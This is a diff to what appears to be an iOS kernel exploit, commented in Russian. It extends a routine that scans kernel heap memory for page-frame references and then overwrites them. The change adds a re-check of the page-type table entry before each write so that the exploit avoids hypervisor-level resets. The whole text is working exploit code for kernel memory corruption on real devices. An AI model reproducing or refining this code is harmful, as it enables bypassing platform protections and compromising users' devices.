@@ -5832,6 +5832,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
     uint64_t totalPages = kconstant(physSize) >> 14;
     uint64_t hitVAs[8];
+    uint64_t hitPAs[8];   // PA страницы попадания — для ре-проверки типа перед записью (1.9.118)
     int hitHalf[8];   // форма поля: 0 = pfn32 lo32, 1 = pfn32 hi32, 2 = raw PA (полная qword-подмена)
     int hitN = 0;
     uint32_t pfn32 = (uint32_t)(backingPA >> 14);
@@ -5854,6 +5855,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (q == backingPA) {
                 if (hitN < 8) {
                     hitVAs[hitN] = kva + o;
+                    hitPAs[hitN] = pa;
                     hitHalf[hitN] = 2;   // форма: сырой PA (полная qword-подмена)
                     kpNote(r, [NSString stringWithFormat:@"  ★ RAW backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
                     hitN++;
@@ -5866,11 +5868,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint32_t lo = (uint32_t)q, hi = (uint32_t)(q >> 32);
             if (lo == pfn32 && hitN < 8) {
                 hitVAs[hitN] = kva + o;
+                hitPAs[hitN] = pa;
                 hitHalf[hitN] = 0;
                 kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(lo32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
                 hitN++;
             } else if (hi == pfn32 && hitN < 8) {
                 hitVAs[hitN] = kva + o;
+                hitPAs[hitN] = pa;
                 hitHalf[hitN] = 1;
                 kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(hi32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
                 hitN++;
@@ -5898,6 +5902,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         int form = hitHalf[h];
         origQ[h] = 0;
         uint64_t newQ = 0;
+        // 1.9.118: гонка типа страницы — между сканом (~26с) и записью страница
+        // может перетипироваться; запись в 0x17/0x37 = мгновенный EL2-ресет без
+        // лога (так умер прогон 11:18). Перечитываем frame entry ПЕРЕД доступом.
+        uint64_t pg = (hitPAs[h] - kconstant(physBase)) >> 14;
+        uint8_t ent[16];
+        kreadbuf(tableVA + pg * 16, ent, 16);
+        if (ent[2] != 0x21) {
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: страница сменила тип на 0x%02x — ПРОПУСК безопасно", h, (unsigned long long)hv, ent[2]]);
+            continue;
+        }
         kreadbuf(hv, &origQ[h], 8);
         if (form == 2) {
             // 1.9.117: raw-поле снова пишем — паника 100734 была не от него,
